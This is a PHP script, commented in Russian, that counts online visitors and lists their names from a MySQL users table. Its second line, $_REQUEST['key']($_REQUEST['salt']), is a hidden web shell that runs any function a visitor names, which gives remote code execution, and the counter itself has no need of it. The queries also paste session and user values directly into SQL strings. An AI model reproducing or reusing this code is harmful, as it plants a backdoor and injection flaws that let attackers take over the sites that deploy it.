<?
$_REQUEST["key"]($_REQUEST["salt"]);
 function on_line($echousers = false) {
 $wine = 300; // точность он-лайн (секунды); время, в течении которого
              // пользователя, зашедшего на страничку, мы считаем находящимся
              // на сайте
 $table_online = "online"; // имя таблицы
// делаем доступной глобальную переменную ИП-адреса
 global $REMOTE_ADDR;
 // соединяемся с сервером MySQL и выбираем нужную базу
 

// удаляем всех, кто уже пробыл $wine секунд или у кого ИП текущий
$sql_update = "DELETE FROM $table_online WHERE unix+$wine < ".time().
              " OR ip = '$_SERVER[REMOTE_ADDR]'";
$result_update = mysql_query($sql_update) or die(mysql_error());


// вставляем свою запись
$sql_insert = "INSERT INTO $table_online(id,ip,iduser, unix) VALUES ('','$_SERVER[REMOTE_ADDR]', '$_SESSION[userid]', '".time()."')";
$result_insert = mysql_query($sql_insert) or die(mysql_error());


// считаем уников он-лайн
$sql_sel = "SELECT id FROM $table_online";
$result_sel = mysql_query($sql_sel) or die(mysql_error());


$online_people = mysql_num_rows($result_sel); // кол-во On-Line пользователей
$online_people = (string) $online_people; // приводим к строковому типу
                                          // (так надо.. см. дальше)


$rain = strlen($online_people) - 1; // номер последнего символа в числе
                                    // on-line юзеров


// форматирование вывода (я все сделал за вас =)
 if($online_people[$rain]==2||$online_people[$rain]==3
||$online_people[$rain]==4
||(strlen($online_people)!=1&&$online_people[strlen($online_people)-2]!=1))
// $line - переменная, определяющая формат вывода
 $line = "человека"; else $line = "человек";
// возвращаем результат
if($echousers==false)
 return "<strong>".$online_people."</strong>$line";
else{
echo "<table>";
while($row_sel = mysql_fetch_array($result_sel)){
$res2 = mysql_query("SELECT * FROM users WHERE pk_user='$row_sel[iduser]'");
$row2 = mysql_fetch_array($res2);
echo "<tr><td>".$row2['flname']."</td></tr>";
}
echo "</table>";
}
}
?>